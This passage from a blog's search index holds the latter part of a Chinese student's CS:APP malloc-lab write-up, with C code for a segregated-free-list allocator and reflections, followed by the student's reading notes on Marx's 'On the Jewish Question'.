(lists[list_idx] != <span class="literal">NULL</span>)))</span><br><span class="line">        {</span><br><span class="line">            ptr = lists[list_idx];</span><br><span class="line">            <span class="comment">/* Seach for a free block of appropriate size */</span></span><br><span class="line">            <span class="keyword">while</span> ((ptr != <span class="literal">NULL</span>) &amp;&amp; ((size &gt; GET_SIZE(HDRP(ptr)))))</span><br><span class="line">            {</span><br><span class="line">                ptr = PRED(ptr);</span><br><span class="line">            }</span><br><span class="line">            <span class="comment">/* Found the corresponding free block */</span></span><br><span class="line">            <span class="keyword">if</span> (ptr != <span class="literal">NULL</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        searchsize &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        ++list_idx;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Failed to find an appropriate block */</span></span><br><span class="line">    <span class="keyword">if</span> (ptr == <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">/* Extend the heap */</span></span><br><span class="line">        <span class="keyword">if</span> ((ptr = extend_heap(MAX(size, CHUNKSIZE))) == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* allocate a block of 'size' bytes in the free block */</span></span><br><span class="line">    ptr = place(ptr, size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>



<h4 id="mm-free"><a href="#mm-free" class="headerlink" title="mm_free:"></a>mm_free:</h4><p>​		释放一个块便是简单地将它的头部（header）和脚部（footer）标记为空闲，并进行可能的空闲块合并操作。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mm_free</span><span class="params">(<span class="type">void</span> *ptr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(ptr));</span><br><span class="line"></span><br><span class="line">    PUT(HDRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Insert free block into segregated free list */</span></span><br><span class="line">    insert_node(ptr, size);</span><br><span class="line">    <span class="comment">/* Coalesce if possible */</span></span><br><span class="line">    coalesce(ptr);</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>



<h4 id="mm-realloc"><a href="#mm-realloc" class="headerlink" title="mm_realloc:"></a>mm_realloc:</h4><p>​		首先进行内存对齐。若调整后的大小小于原先大小，直接返回原本的块*；否则为了减少外部碎片，我们应该尽可能地利用相邻的空闲块，因而检查下一个块是否为空闲块或堆的结尾块。若下一个块为空闲块或已经为堆的结尾块，如剩余的空闲空间仍然足够，直接进行重新分配，否则进行堆的拓展；否则，即没有可以连续利用的空闲块，且调整后的大小大于原块，则只能调用 mm_malloc 重新申请新的不连续的空闲块，并使用复制、释放原块。</p>
<p>​		*: 尝试过若调整后的大小小于原先大小，对原本的块进行有必要的分割，但由于发现实际对于实验结果的提升并不大，遂舍弃。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">mm_realloc</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">void</span> *new_block = ptr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Adjust block size to include overhead and alignment reqs */</span></span><br><span class="line">    <span class="keyword">if</span> (size &lt;= QSIZE)</span><br><span class="line">        size = <span class="number">2</span> * QSIZE;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        size = QSIZE * ((size + (QSIZE) + (QSIZE - <span class="number">1</span>)) / QSIZE);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> remainder;</span><br><span class="line">    <span class="keyword">if</span> ((remainder = GET_SIZE(HDRP(ptr)) - size) &gt;= <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">/* If the size is smaller than the original one,</span></span><br><span class="line"><span class="comment">            the original one is returned directly  */</span></span><br><span class="line">        <span class="keyword">return</span> ptr;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!GET_ALLOC(HDRP(NEXT_BLKP(ptr))) || !GET_SIZE(HDRP(NEXT_BLKP(ptr))))</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">/* Else use adjacent free block as much as possible to reduce external fragmentation */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Still no enough free space */</span></span><br><span class="line">        <span class="keyword">if</span> ((remainder = GET_SIZE(HDRP(ptr)) + GET_SIZE(HDRP(NEXT_BLKP(ptr))) - size) &lt; <span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span> (extend_heap(MAX(-remainder, CHUNKSIZE)) == <span class="literal">NULL</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            remainder += MAX(-remainder, CHUNKSIZE);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Delete the free block just used and set the header and footer of the new block */</span></span><br><span class="line">        delete_node(NEXT_BLKP(ptr));</span><br><span class="line">        PUT(HDRP(ptr), PACK(size + remainder, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(ptr), PACK(size + remainder, <span class="number">1</span>));</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="comment">/* No continuous free blocks available */</span></span><br><span class="line">        new_block = mm_malloc(size);</span><br><span class="line">        <span class="comment">/* Copy and free the original block */</span></span><br><span class="line">        <span class="built_in">memcpy</span>(new_block, ptr, GET_SIZE(HDRP(ptr)));</span><br><span class="line">        mm_free(ptr);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> new_block;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h3 id="Postscript"><a href="#Postscript" class="headerlink" title="Postscript"></a>Postscript</h3><p>​		最后是对辅助函数的说明。</p>
<h4 id="extend-heap"><a href="#extend-heap" class="headerlink" title="extend_heap:"></a>extend_heap:</h4><p>​		为了避免进行过多的 mem_sbrk 调用，只在有必要时进行堆的扩展，且一次分配 CHUNKSIZE 大小（实验中定为 2^12^），再逐步利用新扩展的堆。调用 mem_sbrk 申请新的堆空间后，重新标记堆的结尾块，并将其拓展的堆空间加入分离的空闲链表中，且进行必要的空闲块合并操作。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">extend_heap</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> *bp;</span><br><span class="line">    <span class="comment">/* Memory alignment */</span></span><br><span class="line">    size = ALIGN(size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((bp = mem_sbrk(size)) == (<span class="type">void</span> *)<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Set the header and footer of the block just extended */</span></span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    <span class="comment">/* Set the end of heap */</span></span><br><span class="line">    PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="number">0</span>, <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Insert the free block into segregated free lists */</span></span><br><span class="line">    insert_node(bp, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The previous block may be free as well */</span></span><br><span class="line">    <span class="keyword">return</span> coalesce(bp);</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>



<h4 id="coalesce"><a href="#coalesce" class="headerlink" title="coalesce:"></a>coalesce:</h4><p>​		为了减少假碎片（False Fragmentation），需要将相邻的空闲块进行合并。由于合并策略，在释放当前块前必然不可能有相邻的空块（必然在前面的释放后已完成合并），因此仅需要检查前后是否有空块即可。按照前驱块和后继块的被分配状态分情况讨论，最后将合并的块插入分离的空闲链表中。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">coalesce</span><span class="params">(<span class="type">void</span> *ptr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">_Bool</span> is_prev_alloc = GET_ALLOC(HDRP(PREV_BLKP(ptr)));</span><br><span class="line">    <span class="type">_Bool</span> is_next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(ptr)));</span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(ptr));</span><br><span class="line">    <span class="comment">/* No possibility to have two adjacent free block  */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_prev_alloc &amp;&amp; is_next_alloc)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">/* Both the prev and next blocks are allocated */</span></span><br><span class="line">        <span class="keyword">return</span> ptr;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!is_prev_alloc &amp;&amp; is_next_alloc)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">/* The prev block is free while the next block is allocated */</span></span><br><span class="line">        delete_node(ptr);</span><br><span class="line">        delete_node(PREV_BLKP(ptr));</span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(ptr)));</span><br><span class="line">        PUT(FTRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(ptr)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        ptr = PREV_BLKP(ptr);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (is_prev_alloc &amp;&amp; !is_next_alloc)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">/* The prev block is allocated while the next block is free */</span></span><br><span class="line">        delete_node(ptr);</span><br><span class="line">        delete_node(NEXT_BLKP(ptr));</span><br><span class="line">        size += GET_SIZE(HDRP(NEXT_BLKP(ptr)));</span><br><span class="line">        PUT(HDRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="comment">/* Both prev and next blocks are allocated */</span></span><br><span class="line">        delete_node(ptr);</span><br><span class="line">        delete_node(PREV_BLKP(ptr));</span><br><span class="line">        delete_node(NEXT_BLKP(ptr));</span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(ptr))) + GET_SIZE(HDRP(NEXT_BLKP(ptr)));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(ptr)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(NEXT_BLKP(ptr)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        ptr = PREV_BLKP(ptr);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Insert coalesced blocks into segregated free lists */</span></span><br><span class="line">    insert_node(ptr, size);</span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>



<h4 id="place"><a href="#place" class="headerlink" title="place:"></a>place:</h4><p>​		在 ptr 所指向的空闲块中分配 size 大小的块。若剩下的空间大于等于(QSIZE &lt;&lt; 1)，则将其分离后插入分离的空闲链表中。由于若每次分配块的大小按照小、大交替的顺序进行，且释放时不是按这个顺序的话（如只释放掉所有的大块），会使得外部碎片非常严重（测试点 binary 即为如此）。因此本次实验中的策略是将较小的块放在某个连续的地方，将较大的块也放在某个连续的地方，可以有效减少外部碎片的产生。本次实验中的较大较小的衡量标准为“96”，这是一个魔法数字，是经过几次尝试后选取出来的表现较好的一个值。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">place</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> ptr_size = GET_SIZE(HDRP(ptr));</span><br><span class="line">    <span class="comment">/* allocate size大小的空间后剩余的大小 */</span></span><br><span class="line">    <span class="comment">/* Size of remaining space  */</span></span><br><span class="line">    <span class="type">size_t</span> remainder = ptr_size - size;</span><br><span class="line"></span><br><span class="line">    delete_node(ptr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (remainder &lt; (QSIZE &lt;&lt; <span class="number">1</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">/* If the remaining size is smaller than the minblock size,</span></span><br><span class="line"><span class="comment">            then the original block will not be separated */</span></span><br><span class="line">        PUT(HDRP(ptr), PACK(ptr_size, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(ptr), PACK(ptr_size, <span class="number">1</span>));</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (size &lt; <span class="number">96</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">/* 96 is a magic number which tested best */</span></span><br><span class="line">        <span class="comment">/* Put blocks of small size together to reduce external fragmentation */</span></span><br><span class="line">        PUT(HDRP(ptr), PACK(size, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(ptr), PACK(size, <span class="number">1</span>));</span><br><span class="line">        PUT(HDRP(NEXT_BLKP(ptr)), PACK(remainder, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(NEXT_BLKP(ptr)), PACK(remainder, <span class="number">0</span>));</span><br><span class="line">        insert_node(NEXT_BLKP(ptr), remainder);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="comment">/* alloc space for blocks of large size */</span></span><br><span class="line">        PUT(HDRP(ptr), PACK(remainder, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(ptr), PACK(remainder, <span class="number">0</span>));</span><br><span class="line">        PUT(HDRP(NEXT_BLKP(ptr)), PACK(size, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(NEXT_BLKP(ptr)), PACK(size, <span class="number">1</span>));</span><br><span class="line">        insert_node(ptr, remainder);</span><br><span class="line">        <span class="keyword">return</span> NEXT_BLKP(ptr);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>



<h4 id="insert-node"><a href="#insert-node" class="headerlink" title="insert_node:"></a>insert_node:</h4><p>​		将 ptr 对应的空闲块插入分离的空闲链表中。先通过空闲块的大小找到对应的链，再在该链中继续寻找对应的插入位置，以保证同一类大小的链中块从小到大排列的顺序。找到后根据块的插入位置分别进行讨论即可。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">insert_node</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> list_idx = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Search for the corresponding list by the size of the block */</span></span><br><span class="line">    <span class="keyword">while</span> ((list_idx &lt; SFL_SIZE - <span class="number">1</span>) &amp;&amp; (size &gt; <span class="number">1</span>))</span><br><span class="line">    {</span><br><span class="line">        size &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        ++list_idx;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Found the corresponding list and search for the corresponding place in list */</span></span><br><span class="line">    <span class="type">void</span> *search_ptr = lists[list_idx];</span><br><span class="line">    <span class="type">void</span> *insert_ptr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((search_ptr != <span class="literal">NULL</span>) &amp;&amp; (size &gt; GET_SIZE(HDRP(search_ptr))))</span><br><span class="line">    {</span><br><span class="line">        insert_ptr = search_ptr;</span><br><span class="line">        search_ptr = PRED(search_ptr);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (search_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (insert_ptr != <span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="comment">/* 1. -&gt;xx-&gt;insert-&gt;xx insert between */</span></span><br><span class="line">            SET_PTR(PRED_PTR(ptr), search_ptr);</span><br><span class="line">            SET_PTR(SUCC_PTR(search_ptr), ptr);</span><br><span class="line">            SET_PTR(SUCC_PTR(ptr), insert_ptr);</span><br><span class="line">            SET_PTR(PRED_PTR(insert_ptr), ptr);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            <span class="comment">/* 2. [list_idx]-&gt;insert-&gt;xx insert at the beginning */</span></span><br><span class="line">            SET_PTR(PRED_PTR(ptr), search_ptr);</span><br><span class="line">            SET_PTR(SUCC_PTR(search_ptr), ptr);</span><br><span class="line">            SET_PTR(SUCC_PTR(ptr), <span class="literal">NULL</span>);</span><br><span class="line">            lists[list_idx] = ptr;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (insert_ptr != <span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="comment">/* 3. -&gt;xxxx-&gt;insert insert at the end */</span></span><br><span class="line">            SET_PTR(PRED_PTR(ptr), <span class="literal">NULL</span>);</span><br><span class="line">            SET_PTR(SUCC_PTR(ptr), insert_ptr);</span><br><span class="line">            SET_PTR(PRED_PTR(insert_ptr), ptr);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            <span class="comment">/* 4. [list_idx]-&gt;insert first insertion */</span></span><br><span class="line">            SET_PTR(PRED_PTR(ptr), <span class="literal">NULL</span>);</span><br><span class="line">            SET_PTR(SUCC_PTR(ptr), <span class="literal">NULL</span>);</span><br><span class="line">            lists[list_idx] = ptr;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>



<h3 id="delete-node"><a href="#delete-node" class="headerlink" title="delete_node:"></a>delete_node:</h3><p>​		将 ptr 对应的空闲块从分离的空闲链表中删除。先通过空闲块的大小找到对应的链，再根据块的位置分情况讨论即可。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">delete_node</span><span class="params">(<span class="type">void</span> *ptr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> list_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(ptr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Search for corresponding list by size */</span></span><br><span class="line">    <span class="keyword">while</span> ((list_idx &lt; SFL_SIZE - <span class="number">1</span>) &amp;&amp; (size &gt; <span class="number">1</span>))</span><br><span class="line">    {</span><br><span class="line">        size &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        ++list_idx;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (PRED(ptr) != <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (SUCC(ptr) != <span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="comment">/* 1. xxx-&gt; ptr -&gt; xxx */</span></span><br><span class="line">            SET_PTR(SUCC_PTR(PRED(ptr)), SUCC(ptr));</span><br><span class="line">            SET_PTR(PRED_PTR(SUCC(ptr)), PRED(ptr));</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            <span class="comment">/* 2. [list_idx] -&gt; ptr -&gt; xxx */</span></span><br><span class="line">            SET_PTR(SUCC_PTR(PRED(ptr)), <span class="literal">NULL</span>);</span><br><span class="line">            lists[list_idx] = PRED(ptr);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (SUCC(ptr) != <span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="comment">/* 3. [list_idx] -&gt; xxx -&gt; ptr */</span></span><br><span class="line">            SET_PTR(PRED_PTR(SUCC(ptr)), <span class="literal">NULL</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            <span class="comment">/* 4. [list_idx] -&gt; ptr */</span></span><br><span class="line">            lists[list_idx] = <span class="literal">NULL</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><p><img lazyload="" src="/images/loading.svg" data-src="/malloc-lab.assets/result.png" alt="result"></p>
<p>​		注：测试运行于课程配置的 Linux x86_64服务器上。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol>
<li>BRYANT R E, O&amp;APOS;HALLARON D R. Computer systems : a programmer’s perspective /[M]. 3rd ed.. 北京: Mechanical Industry Press, 2017.</li>
<li><a class="link" href="https://www.cs.cmu.edu/afs/cs/academic/class/15213-f10/www/labs/malloclab-writeup.pdf">malloclab-writeup.pdf (cmu.edu) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ol>
<h2 id="遇到的困难-amp-心得"><a href="#遇到的困难-amp-心得" class="headerlink" title="遇到的困难&心得"></a>遇到的困难&amp;心得</h2><p>​		本次 Lab 让我对动态内存分配有了更深的理解，认识到平时视为平常之至的一个调用背后竟有如此多的学问。同时由于动态内存分配器是较难进行跟踪和代码查错工作的，曾在完成过程中多次遇到 Segmentation fault (core dumped)，因此在完成本次 Lab 后我的代码编写能力和查错能力都有了很大的提高。</p>
<p>​		实验过程中我一度卡在两个 binary 测试点上，苦于 util 提不上去。后面联想到分离的空闲链表的原理，发现对分配块亦可以采用分离的做法，因此有了 place 函数处描述的思路：将较小的块放在某个连续的地方，将较大的块也放在某个连续的地方。这让我学会了学以致用，思路得到了极大的拓展。</p>
]]></content>
      <tags>
        <tag>ics</tag>
        <tag>homework</tag>
      </tags>
  </entry>
  <entry>
    <title>《论犹太人问题》读书笔记</title>
    <url>/2023/01/19/marxist-reading-notes/</url>
    <content><![CDATA[<p>该文为青年马克思在《德法年鉴》期间所作，是对布鲁诺·鲍威尔以青年黑格尔主义为理论基础的对犹太人解放问题的批判所进行的原则性的全面的批判，被列宁认为是“马克思的特别优秀的著作”。全篇语言颇具人本主义色彩，初显青年马克思历史唯物主义和共产主义意识思想萌芽。</p>
<p>全篇分两部分，分别针对鲍威尔的《犹太人问题》和《现代犹太人和基督徒获得自由的能力》进行否定。</p>
<p>第一部分中，马克思首先指出了鲍威尔对犹太人问题的错误认知，即错将犹太人问题视为普遍问题，但事实上该问题只存在于德国，在英、美等国并不存在。同时，他发现鲍威尔在分析犹太人问题时忽略了最关键的对政治解放本身的批判，从而指出了鲍威尔论证逻辑的矛盾性与难以自洽性；而他抓住了政治意识这重要的一环，对宗教和现代国家政治二者关系进行了独特而深刻的剖析。马克思在鲍威尔的宗教异化之上进一步提出了政治异化，即国家已经摆脱了宗教的束缚，但人却没有；虽然在政治上已实现了平权，却仍在市民社会中因宗教信仰、财产差异等因素遭遇不平等的待遇。资本主义国家摆脱了宗教的束缚，国家自由了，但人还在信仰，正是因为人正面临异化的痛苦，“宗教是被压迫的生灵的叹息”，人将自己从异化处拿回，才能不被压迫。</p>
<p>我印象最深刻的是关于马克思对“所谓基督教国家”和“完成了的基督教国家”的论述，这让我想起了《庄子》中“鲁儒少”之言。如同儒士并不是靠衣装成为儒士，基督教国家也并非能通过以国家形式信奉基督教而成为“完成了的基督教国家”。马克思认为应从政治的角度对待宗教，也就同样把宗教降成外观。只有真正实现了政治解放的国家，符合自由、平等、博爱等教义的，才能真正成为基督教国家。</p>
<p>还我印象深刻的是，马克思在讨论神学问题与世俗问题时，一反常规，将神学问题化为世俗问题，同时，他进行了“用历史来说明迷信”的尝试；马克思摆正了神学问题与世俗问题的逻辑，并且初展其辩证唯物主义历史观。</p>
<p>我还从文中感受到了马克思探索真理的实事求是，即便他已然与青年黑格尔派进行了决裂，认为人类解放无法在资产阶级民主主义的政治基础上实现，他依然对黑格尔的观点取一个扬弃的态度。在讨论政治国家对宗教的关系时，他毫不吝啬他的肯定，说明黑格尔确定的政治国家对宗教的关系是“完全正确的”。</p>
<p>第二部分，马克思以现代国际和市民社会之间的关系为核心线索，对市民社会的实际状况进行了批判。此处马克思将犹太教与金钱拜物教划上了等号，他回到了现实的世俗的犹太教中去进行对犹太教秘密的寻找，得出了从经商牟利和金钱中解放出来，便是实际地从犹太教中解放出来，就是自我解放的结论。他持续追问金钱在世俗市民社会中绝对权利的来源，指出这是由于犹太精神在基督教的外壳下广泛传播，使得社会变得利己与狭隘造成的。</p>
<p>金钱本是人在劳动中创造的产物，但在特定的社会条件下却成为了压迫和控制人的异化力量，这是因为市民社会在不断从自身中产生出以经商牟利、发财致富为最高目标的“犹太人”，于是犹太精神也便慢慢成为了市民社会的精神。普通人由此不自由，成为自己获得工资的工具，资本家亦不自由，不竞争则会被淘汰——最终人均成了不自由的，货币控制了人的精神生活和物质生活，成为了一种统治人的力量。</p>
<p>马克思指出，实现人的解放，最终还要诉诸社会的解放，即社会从货币异化中解放出来，而货币异化产生的原因真是市民社会中的犹太精神。因此文章的最后马克思说：“犹太人的社会解放就是社会从犹太精神中解放出来”，而这要求一个社会消除犹太精神的经验本质，杜绝经商牟利及其前提的存在。青年马克思的态度已经很明确了，即资本主义社会必然不能实现真正的社会解放：至此，马克思的共产主义意识初现其萌芽，四年后的《共产主义宣言》仿佛近了！</p>
]]></content>
      <tags>
        <tag>homework</tag>
      </tags>
  </entry>
</search>
